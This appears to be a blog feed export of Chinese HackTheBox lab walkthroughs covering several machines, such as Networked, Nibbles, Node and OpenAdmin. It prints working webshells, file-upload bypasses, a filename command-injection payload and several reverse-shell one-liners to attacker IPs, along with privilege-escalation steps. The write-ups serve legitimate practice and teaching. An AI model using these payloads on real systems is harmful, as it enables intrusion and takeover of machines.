<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat Invoke-PowerShellTcp.ps1 | iconv -t UTF-16LE | base64 -w0</span><br></pre></td></tr></table></figure>

<p>复制这段添加到payload，主要是利用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -enc</span><br><span class="line">powershell -E</span><br></pre></td></tr></table></figure>

<p>这两个参数一个意思</p>
<p><img src="/images/Netmon/14.jpg" alt="14"></p>
<p>成功获取shell</p>
<p><img src="/images/Netmon/15.jpg" alt="15"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Networked</title>
    <url>/2020/06/28/HTB-Networked/</url>
    <content><![CDATA[<h1 id="Networked"><a href="#Networked" class="headerlink" title="Networked"></a>Networked</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Networked/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>主页没啥发现</p>
<p><img src="/images/Networked/2.jpg" alt="2"></p>
<p>开始目录枚举</p>
<p><img src="/images/Networked/3.jpg" alt="3"></p>
<p>发现了备份压缩包，下载并解压</p>
<p><img src="/images/Networked/4.jpg" alt="4"></p>
<p>该页面提示了4个页面，访问确认页面存在</p>
<p><img src="/images/Networked/5.jpg" alt="5"></p>
<p>看来有文件上传可以利用</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="文件上传bypass"><a href="#文件上传bypass" class="headerlink" title="文件上传bypass"></a>文件上传bypass</h3><p>开始进行代码审计</p>
<p>首先是对文件名后缀的限制</p>
<p><img src="/images/Networked/6.jpg" alt="6"></p>
<p>文件类型检查</p>
<p><img src="/images/Networked/13.jpg" alt="13"></p>
<p>检查魔术字节确认文件类型</p>
<p><img src="/images/Networked/7.jpg" alt="7"></p>
<p>开始攻击</p>
<p>如果不修改魔术字节</p>
<p><img src="/images/Networked/8.jpg" alt="8"></p>
<p>上传失败<br>添加魔术字节，可以在如下网址查看到各类型的魔术字节</p>
<p><a href="https://tool.lu/magicbytes/%E6%88%96%E8%80%85https://en.wikipedia.org/wiki/List_of_file_signatures">https://tool.lu/magicbytes/或者https://en.wikipedia.org/wiki/List_of_file_signatures</a></p>
<p>使用010editor手动添加jpg的magic bytes</p>
<p><img src="/images/Networked/10.jpg" alt="10"></p>
<p>尝试上传</p>
<p><img src="/images/Networked/9.jpg" alt="9"></p>
<p>回显提示上传成功<br>在<code>photos.php</code>页面，找到上传路径</p>
<p><img src="/images/Networked/11.jpg" alt="11"></p>
<p>访问路径，发现php代码在.jpg结尾下竟然执行了 ，应该是存在某个解析漏洞</p>
<p><img src="/images/Networked/12.jpg" alt="12"></p>
<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>现在只要写个shell即可</p>
<p><code>shell.php</code> 一句话木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  system($_REQUEST[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>添加magicbytes</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;FF D8&#39; | xxd -p -r &gt; mime_shell.php.jpg</span><br><span class="line">cat shell.php.jpg &gt;&gt; mime_shell.php.jpg</span><br></pre></td></tr></table></figure>

<p>上传访问，确认可以执行</p>
<p><img src="/images/Networked/14.jpg" alt="14"></p>
<p>最后url编码执行反弹shell命令payload</p>
<p><img src="/images/Networked/15.jpg" alt="15"></p>
<p>成功getshell</p>
<p><img src="/images/Networked/16.jpg" alt="16"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现了文件corntab.guly</p>
<p><img src="/images/Networked/17.jpg" alt="17"></p>
<p>是个计划任务</p>
<p>每三分钟运行一次check_attack.php</p>
<p><img src="/images/Networked/18.jpg" alt="18"></p>
<p>这个文件存在漏洞</p>
<p>$value变量存放文件名，它会调用exec执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;bin&#x2F;rm -f &#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;$value</span><br></pre></td></tr></table></figure>

<p>如果我们在那个文件夹建一个文件，文件名包含<code>;</code>来截断命令，系统会执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;bin&#x2F;rm -f &#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;;evilpayload;</span><br></pre></td></tr></table></figure>

<p>所以执行操作(恰巧系统nc带危险c和e参数，不过文件名不能包含/，所以只能用c参数)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www&#x2F;html&#x2F;uploads</span><br><span class="line">touch &quot;;nc -c bash 10.10.16.100 5555;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Networked/19.jpg" alt="19"></p>
<p>成功获取用户guly</p>
<p><img src="/images/Networked/20.jpg" alt="20"></p>
<p>发现能以root运行的shell脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash -p</span><br><span class="line">cat &gt; &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-guly &lt;&lt; EoF</span><br><span class="line">DEVICE&#x3D;guly0</span><br><span class="line">ONBOOT&#x3D;no</span><br><span class="line">NM_CONTROLLED&#x3D;no</span><br><span class="line">EoF</span><br><span class="line"></span><br><span class="line">regexp&#x3D;&quot;^[a-zA-Z0-9_\ &#x2F;-]+$&quot;</span><br><span class="line"></span><br><span class="line">for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do</span><br><span class="line">        echo &quot;interface $var:&quot;</span><br><span class="line">        read x</span><br><span class="line">        while [[ ! $x &#x3D;~ $regexp ]]; do</span><br><span class="line">                echo &quot;wrong input, try again&quot;</span><br><span class="line">                echo &quot;interface $var:&quot;</span><br><span class="line">                read x</span><br><span class="line">        done</span><br><span class="line">        echo $var&#x3D;$x &gt;&gt; &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-guly</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">&#x2F;sbin&#x2F;ifup guly0</span><br></pre></td></tr></table></figure>

<p>发现是一个网络配置文件，在网上能找到提权方式 <a href="https://seclists.org/fulldisclosure/2019/Apr/24">链接</a></p>
<p>这个提权比较有意思，利用了下面这样的特性，发现命令执行了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#a&#x3D;test</span><br><span class="line">root@kali:~#echo $a</span><br><span class="line">test</span><br><span class="line"></span><br><span class="line">root@kali:~#a&#x3D;test id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure>

<p>而上面的脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">regexp&#x3D;&quot;^[a-zA-Z0-9_\ &#x2F;-]+$&quot;			\ 表示允许使用空格</span><br></pre></td></tr></table></figure>

<p>所以我猜，应该是最后的<code>/sbin/ifup guly0</code>触发了上面的特性，得到了RCE</p>
<p>输入信息加空格bash，就可以获得root shell</p>
<p><img src="/images/Networked/21.jpg" alt="21"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Nibbles</title>
    <url>/2020/06/10/HTB-Nibbles/</url>
    <content><![CDATA[<h1 id="Nibbles"><a href="#Nibbles" class="headerlink" title="Nibbles"></a>Nibbles</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Nibbles/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问80端口</p>
<p><img src="/images/Nibbles/2.jpg" alt="2"></p>
<p>源代码提示了一个目录</p>
<p><img src="/images/Nibbles/4.jpg" alt="4"></p>
<p>看来运行的是一个博客系统，叫Nibbleblog，版本4.0.3<br>尝试搜寻公开漏洞</p>
<p><img src="/images/Nibbles/6.jpg" alt="6"></p>
<p>只发现一个metasploit有一个文件上传漏洞，不过需要用户账户和密码</p>
<p>我尝试进行目录枚举，看能否发现更多信息</p>
<p><img src="/images/Nibbles/5.jpg" alt="5"></p>
<p>发现了admin.php的一个登录页面</p>
<p><img src="/images/Nibbles/7.jpg" alt="7"></p>
<p>我尝试进行暴力破解，不过一会儿就给我拉进黑名单了<br>所以只能手动尝试</p>
<p><img src="/images/Nibbles/8.jpg" alt="8"></p>
<p>之后在这个网站进行一些收集，使用弱口令登录成功</p>
<p>账户/密码:<code>nibbles/nibbles</code></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="后台上传"><a href="#后台上传" class="headerlink" title="后台上传"></a>后台上传</h3><p><img src="/images/Nibbles/9.jpg" alt="9"></p>
<p>找到了上传点</p>
<p><img src="/images/Nibbles/10.jpg" alt="10"></p>
<p>上传phpshell成功，而且根据首页image可以推测出路径位置<code>10.10.10.75/nibbleblog/content/private/plugins/my_image/</code><br>不过访问shell似乎不能成功</p>
<p><img src="/images/Nibbles/11.jpg" alt="11"></p>
<p>后来去查看了一下metasploit脚本是怎么写的: <a href="https://www.exploit-db.com/exploits/38489">链接</a></p>
<p><img src="/images/Nibbles/12.jpg" alt="12"></p>
<p>shell要修改为image.php，看来是存在白名单</p>
<p>之后就可以成功获取shell</p>
<p><img src="/images/Nibbles/13.jpg" alt="13"></p>
<p>顺手升级为交互shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="方法1-sudo"><a href="#方法1-sudo" class="headerlink" title="方法1 (sudo)"></a>方法1 (sudo)</h3><p><img src="/images/Nibbles/14.jpg" alt="14"></p>
<p>我发现在我用户的主目录下存在能以root权限执行的shell脚本，说明我具有w权限<br>过去发现没目录没文件，自己建就好</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.132&#x2F;5555 0&gt;&amp;1&quot;&#39; &gt; monitor.sh</span><br><span class="line">sudo .&#x2F;monitor.sh</span><br></pre></td></tr></table></figure>

<p><img src="/images/Nibbles/15.jpg" alt="15"></p>
<p>即可获取root</p>
<p>这里有一个问题，如果不用bash -c</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.132&#x2F;5555 0&gt;&amp;1&quot; &gt; monitor.sh</span><br></pre></td></tr></table></figure>

<p>会报错:<code>Syntax error: Bad fd number</code></p>
<p><img src="/images/Nibbles/16.jpg" alt="16"></p>
<h3 id="方法2-kernel-exploit"><a href="#方法2-kernel-exploit" class="headerlink" title="方法2 (kernel exploit)"></a>方法2 (kernel exploit)</h3><p>使用<code>linux-exploit-suggester.sh</code>，发现了疑似基于glibc库的漏洞利用</p>
<p><img src="/images/Nibbles/17.png" alt="17"></p>
<p>枚举本地版本，确认漏洞可信度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldd --version</span><br></pre></td></tr></table></figure>

<p><img src="/images/Nibbles/18.png" alt="18"></p>
<p>再查看ubuntu的发行版，也是吻合的</p>
<p><img src="/images/Nibbles/19.png" alt="19"></p>
<p>EDB里找到Exp</p>
<p><img src="/images/Nibbles/20.png" alt="20"></p>
<p>到目标机器上编译并执行，虽然有警告，但漏洞利用成功了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc 43775.c -o exploit</span><br></pre></td></tr></table></figure>

<p><img src="/images/Nibbles/21.png" alt="21"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:October</title>
    <url>/2020/10/19/HTB-October/</url>
    <content><![CDATA[<h1 id="October"><a href="#October" class="headerlink" title="October"></a>October</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/October/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>手动访问80</p>
<p><img src="/images/October/2.png" alt="2"></p>
<p>发现october cms</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>直接搜索公开漏洞</p>
<p><img src="/images/October/3.png" alt="3"></p>
<p>唯一有用的可能是41936</p>
<p><img src="/images/October/4.png" alt="4"></p>
<p>发现上传绕过 ，通过添加后缀php5，开始寻找上传点</p>
<p>进行目录扫描</p>
<p><img src="/images/October/6.png" alt="6"></p>
<p>发现backend，那个是登录后台登录页面</p>
<p><img src="/images/October/7.png" alt="7"></p>
<p>这里有点麻烦，枚举的线程多了会有问题，其实不用枚举也可以，有一个奇怪的现象，前台注册账号后，会跳转到这个页面</p>
<p><img src="/images/October/5.png" alt="5"></p>
<p>通过一些搜索可以找到默认登录凭据<code>admin/admin</code></p>
<p>之后可以成功登录，找到上传点，并且提醒了php5扩展名</p>
<p><img src="/images/October/8.png" alt="8"></p>
<p>上传shell</p>
<p><img src="/images/October/9.png" alt="9"></p>
<p>直接给出了路径</p>
<p><img src="/images/October/10.png" alt="10"></p>
<p>获取RCE，这样就能反弹shell了</p>
<p><img src="/images/October/11.png" alt="11"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Node</title>
    <url>/2020/06/24/HTB-Node/</url>
    <content><![CDATA[<h1 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/node/1.jpg" alt="1"></p>
<p>可以发现22 SSH和3000 HTTP服务</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>从http服务进行枚举</p>
<p>先进行目录扫描，神奇的是一个目录都没有扫描出来，这是不正常的<br>很明显目标正在阻止我们的扫描，用burp转发，抓包进行分析</p>
<p>这是dirbuster的包</p>
<p><img src="/images/node/2.jpg" alt="2"></p>
<p>这是一个正常数据包</p>
<p><img src="/images/node/3.jpg" alt="3"></p>
<p>对比发现UA可能是被过滤的原因</p>
<p><img src="/images/node/4.jpg" alt="4"></p>
<p>修改UA后数据包正常，所以也许应该修改UA再进行枚举</p>
<p><img src="/images/node/5.jpg" alt="5"></p>
<p>不过我们又遇到了问题</p>
<p><img src="/images/node/6.jpg" alt="6"></p>
<p>虽然程序跑起来了，但是对方会对我的任何回应返回网页的主页，这下只能放弃枚举了</p>
<p>尝试使用burpsuite爬虫，看看能发现什么有用信息</p>
<p><img src="/images/node/7.jpg" alt="7"></p>
<p>发现了目录api/users，里面存放了加密的敏感信息</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>破解密码，得到账号密码组合<code>myP14ceAdm1nAcc0uNT/manchester</code>，执行登录</p>
<p><img src="/images/node/8.jpg" alt="8"></p>
<p>登录后，提示下载文件，进行下载</p>
<p><img src="/images/node/9.jpg" alt="9"></p>
<p>文件进行过base64编码，进行解码，顺便看看新的文件的文件类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base64 -d myplace.backup &gt; new.backup</span><br><span class="line">file new.backup</span><br></pre></td></tr></table></figure>

<p><img src="/images/node/10.jpg" alt="10"></p>
<p>是一个zip压缩包，尝试解压</p>
<p>坑爹 ，还带密码，尝试破解密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fcrackzip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u new.zip</span><br></pre></td></tr></table></figure>

<p>破解出密码<code>magicword</code></p>
<p>解压    </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unzip new.zip</span><br><span class="line">magicword</span><br></pre></td></tr></table></figure>

<p>在众多文件中，发现了疑似账号密码的信息<code>mark/5AYRft73VtFpc84k</code>，尝试连接ssh</p>
<p><img src="/images/node/11.jpg" alt="11"></p>
<p><img src="/images/node/12.jpg" alt="12"></p>
<p>成功连接</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>内核提权</p>
<p>目标为ubuntu 4.0.4</p>
<p><img src="/images/node/13.jpg" alt="13"></p>
<p>提权成功</p>
<p><img src="/images/node/14.jpg" alt="14"></p>
<p>方法2</p>
<p>发现tom账号正在运行数据库</p>
<p><img src="/images/node/15.jpg" alt="15"></p>
<p>登录进数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mongo -u mark scheduler -p</span><br><span class="line">5AYRft73VtFpc84k</span><br></pre></td></tr></table></figure>

<p>插入reverse_shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.tasks.insertOne( &#123; &quot;cmd&quot;:&quot;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|&#x2F;bin&#x2F;nc 10.10.16.99 4444 &gt;&#x2F;tmp&#x2F;f&quot;&#125;);</span><br></pre></td></tr></table></figure>

<p><img src="/images/node/16.jpg" alt="16"></p>
<p>获取shell</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:OpenAdmin</title>
    <url>/2020/10/26/HTB-OpenAdmin/</url>
    <content><![CDATA[<h1 id="OpenAdmin"><a href="#OpenAdmin" class="headerlink" title="OpenAdmin"></a>OpenAdmin</h1><p>比较简单但典型的机器，可以复习一些常使用的知识</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/OpenAdmin/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>主页没有发现，进行目录枚举</p>
<p><img src="/images/OpenAdmin/2.png" alt="2"></p>
<p>在很多目录下都发现了<code>colorlib</code>，这看起来是一个wordpress的主题，并且没有公开漏洞</p>
<p><img src="/images/OpenAdmin/3.png" alt="3"></p>
<p>继续检查，在<code>/ona</code>发现了<code>openetadmin</code>，并且给出具体的版本</p>
<p><img src="/images/OpenAdmin/4.png" alt="4"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>搜索公开漏洞</p>
<p><img src="/images/OpenAdmin/5.png" alt="5"></p>
<h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>查看47691.sh</p>
<p><img src="/images/OpenAdmin/6.png" alt="6"></p>
<p>应该是只需要一个HTTP请求完成的RCE，修改它，给curl通过代理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -x &#39;http:&#x2F;&#x2F;127.0.0.1:8080&#39;</span><br></pre></td></tr></table></figure>

<p>尝试运行它，会遇到报错</p>
<p><img src="/images/OpenAdmin/7.png" alt="7"></p>
<p>又是一个<code>command not found</code>的问题，是linux的换行符<code>\n</code>的问题</p>
<p><img src="/images/OpenAdmin/8.png" alt="8"></p>
<p>修复它并执行</p>
<p><img src="/images/OpenAdmin/9.png" alt="9"></p>
<p>burp成功抓到了包，可以发送的repeater</p>
<p><img src="/images/OpenAdmin/10.png" alt="10"></p>
<p>成功获得RCE，反弹shell到本地，注意URL编码</p>
<p><img src="/images/OpenAdmin/11.png" alt="11"></p>
<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>虽然与标注版本不同，但是26682.txt是可以使用的，利用起来稍微麻烦点，阅读理解它比较关键</p>
<p>首先它提供了一个html页面，来生成攻击参数，它会发送至目标的<code>dcm.php</code>来添加一个模块，而且会将模块的路径参数设置为<code>../../../../../../../../../../../var/log/ona.log</code>，之后去访问<code>dcm.php?module=模块名</code>就能获得RCE，看起来有点像LFI污染日志获得RCE的感觉，不过包含的文件地址是通过添加模块地址时注入的，包含的文件直接就是模块名</p>
<p>顺着步骤来</p>
<p>首先获得攻击的payload</p>
<p><img src="/images/OpenAdmin/15.png" alt="15"></p>
<p>修改http请求的参数，并修改burp的target地址</p>
<p><img src="/images/OpenAdmin/14.png" alt="14"></p>
<p>而且可以发现，添加的模块名，叫做<code>mandat0ry</code>，注入的payload是<code>&lt;?php echo shell_exec($_GET[1]) ?&gt;</code>去访问漏洞页面:<a href="http://10.10.10.171/ona/dcm.php?module=mandat0ry">http://10.10.10.171/ona/dcm.php?module=mandat0ry</a></p>
<p><img src="/images/OpenAdmin/16.png" alt="16"></p>
<p>看起来应该是成功包含了日志，发送RCE命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.171&#x2F;ona&#x2F;dcm.php?module&#x3D;mandat0ry&amp;1&#x3D;id</span><br></pre></td></tr></table></figure>

<p>成功获得RCE</p>
<p><img src="/images/OpenAdmin/17.png" alt="17"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现普通用户</p>
<p><img src="/images/OpenAdmin/12.png" alt="12"></p>
<h3 id="jimmy"><a href="#jimmy" class="headerlink" title="jimmy"></a>jimmy</h3><p>常规套路去找ona这个cms的mysql登录凭据，文件比较深，搜索发现比较快:<a href="https://fossies.org/linux/ona/docs/INSTALL">https://fossies.org/linux/ona/docs/INSTALL</a></p>
<p><img src="/images/OpenAdmin/21.png" alt="21"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;opt&#x2F;ona&#x2F;www&#x2F;local&#x2F;config&#x2F;database_settings.inc.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/OpenAdmin/22.png" alt="22"></p>
<p>查招凭据</p>
<p><img src="/images/OpenAdmin/18.png" alt="18"></p>
<p>不过破解出的内容不能切换到普通用户</p>
<p><img src="/images/OpenAdmin/19.png" alt="19"></p>
<p>但是mysql的连接密码可以切换到jimmy <code>n1nj4W4rri0R!</code></p>
<p><img src="/images/OpenAdmin/23.png" alt="23"></p>
<p>虽然知道密码，但是jimmy不在sudo组，有点失望，继续收集信息</p>
<p>发现了一个特殊的web目录，创建者是jimmy</p>
<p><img src="/images/OpenAdmin/20.png" alt="20"></p>
<p>确实是nmap没发现的站点</p>
<p><img src="/images/OpenAdmin/24.png" alt="24"></p>
<p>寻找apache的配置文件，希望找到端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf</span><br></pre></td></tr></table></figure>

<p>上面都没发现，在<code>/etc/apache2/sites-enabled</code>目录下发现了端口号</p>
<p><img src="/images/OpenAdmin/25.png" alt="25"></p>
<p>远程端口转发，22端口不通，换一个就行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -R 52846:127.0.0.1:6666 jimmy@10.10.10.171 -p 53</span><br></pre></td></tr></table></figure>

<p>得到要给登录页面</p>
<p><img src="/images/OpenAdmin/26.png" alt="26"></p>
<p>查看该页面的源代码，需要破解这个sha512的密文</p>
<p><img src="/images/OpenAdmin/27.png" alt="27"></p>
<p>破解成功</p>
<p><img src="/images/OpenAdmin/28.png" alt="28"></p>
<p>使用<code>jimmy / Revealed</code>登录</p>
<p>得到密文</p>
<p><img src="/images/OpenAdmin/29.png" alt="29"></p>
<p>这里其实不一定要破解这个sha512，查看<code>main.php</code>，可以得到提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php session_start(); if (!isset ($_SESSION[&#39;username&#39;])) &#123; header(&quot;Location: &#x2F;index.php&quot;); &#125;; </span><br><span class="line"># Open Admin Trusted</span><br><span class="line"># OpenAdmin</span><br><span class="line">$output &#x3D; shell_exec(&#39;cat &#x2F;home&#x2F;joanna&#x2F;.ssh&#x2F;id_rsa&#39;);</span><br><span class="line">echo &quot;&lt;pre&gt;$output&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h3&gt;Don&#39;t forget your &quot;ninja&quot; password&lt;&#x2F;h3&gt;</span><br><span class="line">Click here to logout &lt;a href&#x3D;&quot;logout.php&quot; tite &#x3D; &quot;Logout&quot;&gt;Session</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>首先，非常容易发现，它执行了<code>cat /home/joanna/.ssh/id_rsa</code>，可以推测出<code>joanna</code>在这个端口运行了apache服务</p>
<p>并且当前用户jimmy是<code>/var/www/internal</code>的创建者，拥有W权限，我们可以直接写个webshell到里面</p>
<p><img src="/images/OpenAdmin/30.png" alt="30"></p>
<p>这样，这个webshell的权限就会是joanna，成功完成了用户切换，这里可以确实看见joanna运行了apache</p>
<p><img src="/images/OpenAdmin/32.png" alt="32"></p>
<p>或者这里的PHP代码出现了问题，完全不需要端口转发</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php session_start(); if (!isset ($_SESSION[&#39;username&#39;])) &#123; header(&quot;Location: &#x2F;index.php&quot;); &#125;; </span><br></pre></td></tr></table></figure>

<p>有对session的判断，如果没有登录成功获得session的话，应该会返回<code>index.php</code>，但是由于漏写了die()或exit()退出程序，导致后面代码继续执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php session_start(); if (!isset ($_SESSION[&#39;username&#39;])) &#123; header(&quot;Location: &#x2F;index.php&quot;; die); &#125;;</span><br></pre></td></tr></table></figure>

<p>所以直接curl就行</p>
<p><img src="/images/OpenAdmin/31.png" alt="31"></p>
<h3 id="joana"><a href="#joana" class="headerlink" title="joana"></a>joana</h3><p>尝试ssh，发现密钥没加密了</p>
<p><img src="/images/OpenAdmin/33.png" alt="33"></p>
<p>破解它</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python &#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py &#x2F;root&#x2F;Desktop&#x2F;id_rsa &gt;hash</span><br><span class="line">john hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p>得到<code>bloodninjas</code>，这样就能获取shell了</p>
<p><img src="/images/OpenAdmin/35.png" alt="35"></p>
<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p><img src="/images/OpenAdmin/36.png" alt="36"></p>
<p>正常来看，应该是允许使用root权限运行nan编辑<code>/opt/priv</code>，有一个使用sudo下nano进行提权</p>
<p><img src="/images/OpenAdmin/37.png" alt="37"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo &#x2F;bin&#x2F;nano &#x2F;opt&#x2F;priv</span><br><span class="line">ctrl+r</span><br><span class="line">ctrl+x</span><br><span class="line">reset; sh 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure>

<p>获得root</p>
<p><img src="/images/OpenAdmin/38.png" alt="38"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Optimum</title>
    <url>/2020/06/09/HTB-Optimum/</url>
    <content><![CDATA[<h1 id="Optimum"><a href="#Optimum" class="headerlink" title="Optimum"></a>Optimum</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Optimum/1.jpg" alt="1"></p>
<p>只有80端口开放，运行这HFS 2.3，是一个类似于FTP的文件管理服务</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h3><p><code>windows/http/rejetto_hfs_exec</code></p>
<p><img src="/images/Optimum/2.jpg" alt="2"></p>
<h3 id="不使用msf"><a href="#不使用msf" class="headerlink" title="不使用msf"></a>不使用msf</h3><p><img src="/images/Optimum/3.jpg" alt="3"></p>
<p>只有一个py，所以我决定使用39161.py</p>
<p><img src="/images/Optimum/4.jpg" alt="4"></p>
<p>说明里写了你需要在80端口存放<code>nc.exe</code></p>
<p><img src="/images/Optimum/5.jpg" alt="5"></p>
<p>接着修改本机地址</p>
<p>修改两处后运行脚本</p>
<p><img src="/images/Optimum/6.jpg" alt="6"></p>
<p>成功获取shell</p>
